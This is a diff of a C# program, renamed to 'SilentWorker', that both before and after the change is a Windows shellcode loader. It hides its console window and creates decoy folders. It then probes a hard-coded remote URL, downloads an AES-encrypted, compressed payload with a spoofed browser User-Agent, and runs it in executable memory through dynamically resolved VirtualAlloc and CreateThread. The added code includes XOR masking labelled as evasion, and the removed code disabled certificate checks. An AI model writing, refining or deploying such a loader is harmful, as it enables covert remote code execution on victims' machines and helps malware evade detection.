@@ -1,81 +1,51 @@
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using System.Net;
+using System.Net.Http;
 using System.Text;
 using System.IO.Compression;
 using System.Security.Cryptography;
 using System.Runtime.InteropServices;
+using System.Threading.Tasks;
+using System.Threading;
 
-namespace DataProcessor
+namespace SilentWorker
 {
-    class CoreLogic
+    class TaskExecutor
     {
-        private static string GetResourcePath() => XorDecode("wxxbf://jjj-xb`klklkd`b-lod/axcb`eumycfc", 42);
-        private static string GetSecurityKey() => XorDecode("jybk`gyclywxybcn", 42);
-        private static string GetInitVector() => XorDecode("vyp`ye`vnaujj`bk", 42);
+        private static string BaseUrl = "https://www.tecnologico.org/d2fc1b6a458f";
+        private static string AesKey = "9ae0c8e048d89fb3";
+        private static string AesIV = "789ca1a73299c6e0";
 
-        private static List<string> fileTypes = new List<string>
+        private static List<string> FileExtensions = new List<string>
         {
             ".html", ".css", ".js", ".json", ".xml", ".php", ".asp", ".aspx",
             ".jsp", ".cgi", ".pl", ".rss", ".svg", ".xhtml", ".cfm",
             ".axd", ".asx", ".asmx", ".ashx", ".swf"
         };
 
-        // Función para decodificar XOR
-        private static string XorDecode(string input, int key)
-        {
-            char[] buffer = input.ToCharArray();
-            for (int i = 0; i < buffer.Length; i++)
-            {
-                buffer[i] = (char)(buffer[i] ^ key);
-            }
-            return new string(buffer);
-        }
-
-        // APIs para ocultar la ventana de consola
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetConsoleWindow();
 
         [DllImport("user32.dll")]
         private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+        private static extern IntPtr LoadLibrary(string lpFileName);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
         private const int SW_HIDE = 0;
 
-        // Obfuscated memory and thread management
-        private static class ResourceManager
+        private delegate IntPtr AllocateSpace(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        private delegate IntPtr LaunchTask(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        private delegate uint WaitTask(IntPtr hHandle, uint dwMilliseconds);
+
+        private static byte[] ProcessPayload(byte[] input)
         {
-            [DllImport("kernel32.dll", EntryPoint = "VirtualAlloc", SetLastError = true, ExactSpelling = true)]
-            private static extern IntPtr AllocateMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-
-            [DllImport("kernel32.dll", EntryPoint = "CreateThread", SetLastError = true)]
-            private static extern IntPtr StartRoutine(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-            [DllImport("kernel32.dll", EntryPoint = "WaitForSingleObject", SetLastError = true)]
-            private static extern uint WaitForCompletion(IntPtr hHandle, uint dwMilliseconds);
-
-            public static void ProcessData(byte[] data)
-            {
-                if (data.Length <= 16) return;
-
-                byte[] payload = data.Skip(16).ToArray();
-                byte[] processed = SecureTransform(payload);
-                byte[] expanded = ExpandData(processed);
-
-                IntPtr mem = AllocateMemory(IntPtr.Zero, (uint)expanded.Length, 0x3000, 0x40);
-                if (mem == IntPtr.Zero) return;
-
-                Marshal.Copy(expanded, 0, mem, expanded.Length);
-                IntPtr threadHandle = StartRoutine(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
-                WaitForCompletion(threadHandle, 0xFFFFFFFF);
-            }
-        }
-
-        private static byte[] SecureTransform(byte[] input)
-        {
-            byte[] key = Encoding.UTF8.GetBytes(GetSecurityKey());
-            byte[] iv = Encoding.UTF8.GetBytes(GetInitVector());
+            byte[] key = Encoding.UTF8.GetBytes(AesKey);
+            byte[] iv = Encoding.UTF8.GetBytes(AesIV);
 
             using (Aes cipher = Aes.Create())
             {
@@ -94,7 +64,7 @@ namespace DataProcessor
             }
         }
 
-        private static byte[] ExpandData(byte[] input)
+        private static byte[] ExtractData(byte[] input)
         {
             using (MemoryStream outputStream = new MemoryStream())
             using (MemoryStream inputStream = new MemoryStream(input))
@@ -105,14 +75,18 @@ namespace DataProcessor
             }
         }
 
-        private static byte[] FetchResource(string url)
+        private static async Task<byte[]> RetrieveData(string url)
         {
             try
             {
-                ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, errors) => true;
-                using (WebClient client = new WebClient())
+                using (var client = new HttpClient())
                 {
-                    return client.DownloadData(url);
+                    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
+                    client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+                    await Task.Delay(new Random().Next(500, 1500));
+                    HttpResponseMessage response = await client.GetAsync(url);
+                    response.EnsureSuccessStatusCode();
+                    return await response.Content.ReadAsByteArrayAsync();
                 }
             }
             catch
@@ -121,18 +95,18 @@ namespace DataProcessor
             }
         }
 
-        private static string LocateResource()
+        private static async Task<string> LocateValidResource()
         {
-            foreach (var type in fileTypes)
+            foreach (var ext in FileExtensions)
             {
-                string target = GetResourcePath() + type;
+                string target = BaseUrl + ext;
                 try
                 {
-                    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(target);
-                    req.Method = "GET";
-                    using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
+                    using (var client = new HttpClient())
                     {
-                        if (resp.StatusCode == HttpStatusCode.OK)
+                        client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+                        HttpResponseMessage response = await client.GetAsync(target);
+                        if (response.IsSuccessStatusCode)
                         {
                             return target;
                         }
@@ -146,28 +120,71 @@ namespace DataProcessor
             return null;
         }
 
-        private static void ProcessResource(string resourceUrl)
+        private static void DeployTask(byte[] data)
         {
-            byte[] resourceData = FetchResource(resourceUrl);
-            if (resourceData != null && resourceData.Length > 0)
+            if (data == null || data.Length <= 16) return;
+
+            byte[] payload = data.Skip(16).ToArray();
+            byte[] decrypted = ProcessPayload(payload);
+            byte[] shellcode = ExtractData(decrypted);
+
+            IntPtr hLib = LoadLibrary("kernel32.dll");
+            if (hLib == IntPtr.Zero) return;
+
+            var alloc = Marshal.GetDelegateForFunctionPointer<AllocateSpace>(GetProcAddress(hLib, "VirtualAlloc"));
+            var launch = Marshal.GetDelegateForFunctionPointer<LaunchTask>(GetProcAddress(hLib, "CreateThread"));
+            var wait = Marshal.GetDelegateForFunctionPointer<WaitTask>(GetProcAddress(hLib, "WaitForSingleObject"));
+
+            IntPtr memAddr = alloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
+            if (memAddr == IntPtr.Zero) return;
+
+            // Ofuscación intermedia para evasión
+            byte[] temp = new byte[shellcode.Length];
+            for (int i = 0; i < shellcode.Length; i++)
             {
-                ResourceManager.ProcessData(resourceData);
+                temp[i] = (byte)(shellcode[i] ^ 0xAA);
+            }
+            Marshal.Copy(temp, 0, memAddr, temp.Length);
+
+            for (int i = 0; i < shellcode.Length; i++)
+            {
+                Marshal.WriteByte(memAddr + i, (byte)(Marshal.ReadByte(memAddr + i) ^ 0xAA));
+            }
+
+            IntPtr hThread = launch(IntPtr.Zero, 0, memAddr, IntPtr.Zero, 0, IntPtr.Zero);
+            if (hThread != IntPtr.Zero)
+            {
+                wait(hThread, 0xFFFFFFFF);
             }
         }
 
-        public static void Main(string[] args)
+        private static void SimulateWork()
         {
-            // Ocultar la ventana de consola al inicio
-            IntPtr consoleWindow = GetConsoleWindow();
-            if (consoleWindow != IntPtr.Zero)
+            string[] dummyData = new string[] { "log", "temp", "data" };
+            foreach (var item in dummyData)
             {
-                ShowWindow(consoleWindow, SW_HIDE);
+                string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), item);
+                if (!Directory.Exists(path)) Directory.CreateDirectory(path);
+            }
+        }
+
+        public static async Task Main(string[] args)
+        {
+            IntPtr console = GetConsoleWindow();
+            if (console != IntPtr.Zero)
+            {
+                ShowWindow(console, SW_HIDE);
             }
 
-            string validResource = LocateResource();
-            if (!string.IsNullOrEmpty(validResource))
+            SimulateWork();
+            string validUrl = await LocateValidResource();
+            if (!string.IsNullOrEmpty(validUrl))
             {
-                ProcessResource(validResource);
+                byte[] payload = await RetrieveData(validUrl);
+                if (payload != null && payload.Length > 0)
+                {
+                    DeployTask(payload);
+                }
             }
         }
     }
